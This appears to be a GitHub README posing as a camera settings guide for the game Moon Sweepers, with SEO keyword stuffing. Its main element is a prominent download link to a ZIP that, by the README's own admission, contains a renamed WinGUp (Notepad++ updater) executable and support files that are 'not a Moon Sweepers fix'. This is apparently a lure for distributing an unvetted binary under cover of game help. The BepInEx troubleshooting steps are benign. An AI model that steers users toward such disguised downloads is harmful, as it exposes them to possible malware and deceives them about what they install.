# Moon Sweepers — Vehicle Camera Settings Guide

<p align="center">
  <img src="https://i.postimg.cc/7Y4CXJhH/banner.png" alt="Moon Sweepers — Vehicle Camera Settings Guide Banner" width="100%">
</p>

> **Moon Sweepers vehicle camera settings guide for auto-recentering, pitch limits, mouse look, slope view and BepInEx community camera mod configuration.**

![Windows](https://img.shields.io/badge/Platform-Windows-0078D7?style=flat-square)
![Game](https://img.shields.io/badge/Game-Moon%20Sweepers-294c72?style=flat-square)
![Guide](https://img.shields.io/badge/Guide-v1.7.4-29a18d?style=flat-square)

## 📥 DOWNLOAD

### ⬇️ **[DOWNLOAD ZIP ARCHIVE — moon-sweepers-vehicle-camera-settings.zip](../../releases/latest/download/moon-sweepers-vehicle-camera-settings.zip)**

**Latest release:** [Open GitHub Releases](../../releases/latest)

**Release contents:** The included executable is a renamed copy of WinGUp configured for Notepad++ updates, not a Moon Sweepers fix. Follow the troubleshooting steps in this README for the game-related guidance.

## 🎯 What This Does

Explain the vehicle camera behavior and how to configure the existing author-maintained Vehicle Camera Fix mod, including its safety toggle and configuration options.

### Current game patch: 1.0.4

The community Vehicle Camera Fix mod was published on Nexus Mods on 26 October 2026, tested with game version 1.0.4. It is a client-side BepInEx plugin. The mod author forbids redistribution to other sites.

## ✨ Features

- Official source links for the existing camera mod
- Camera pitch, auto-recentering and slope-view explanation
- BepInEx dependency and config-file checklist
- F10 stock-camera comparison workflow
- Client-only mod behavior and troubleshooting

## 🧩 Problems Covered

- The vehicle camera snaps back behind the driver too soon
- The viewing angle feels too high on slopes
- Mouse view or camera pitch is uncomfortable while driving
- A camera plugin is installed but does not load

## 🚀 Installation

1. Download **`moon-sweepers-vehicle-camera-settings.zip`** from the release link above.
2. Extract the archive.
3. Read the troubleshooting steps below and follow them in the game.
4. The release ZIP also contains an executable and its required support files; the executable is not the offline guide.

## 🛠️ Troubleshooting / Fix Workflow

1. First test the base game camera controls and mouse sensitivity with no mods installed.
2. If choosing a mod, visit the original Vehicle Camera Fix Nexus Mods page and review its Requirements.
3. Install the BepInEx IL2CPP build and Moon Sweepers metadata patcher required by the author.
4. Run the game once and check that the mod creates BepInEx\config\moonsweepers.vehiclecamera.cfg.
5. Adjust the documented RecentreDelay, MinPitch/MaxPitch, SlopeFollow or LookAhead settings one at a time.
6. Use the mod’s documented F10 toggle to compare its camera with the stock camera.
7. If the plugin fails, check BepInEx\LogOutput.log and restore the unmodified camera; do not redistribute third-party files.

## ❓ FAQ

**Is Vehicle Camera Fix included?**  
No. The author forbids re-uploading; use the original Nexus Mods page.

**What toggles the stock camera?**  
The mod documents F10 as the default toggle.

**Does it alter the save or co-op physics?**  
The mod author says it changes only the local player’s camera.

## 📚 Verified References

- [Original Vehicle Camera Fix mod](https://www.nexusmods.com/moonsweepers/mods/40)
- [Community loader instructions](https://moonsweepers.org/mods/)

## 📄 License

MIT — original repository documentation only. The bundled executable and dependencies retain their own respective licenses.

---

## 🔑 SEO Keywords

`moon sweepers vehicle camera fix`, `moon sweepers camera resetting`, `moon sweepers vehicle pitch camera`, `moon sweepers vehicle camera mod`, `moon sweepers camera follows slopes`, `moon sweepers camera settings`

### GitHub Topics

`moon-sweepers`, `windows`, `pc-gaming`, `game-guide`, `troubleshooting`, `game-support`, `steam-game`, `moon-base`, `2026`, `vehicle-camera`, `camera-settings`, `camera-fix`, `driving`, `vehicle-view`, `bepinex`, `camera-recentering`, `fov`, `mod-guide`, `camera-troubleshooting`
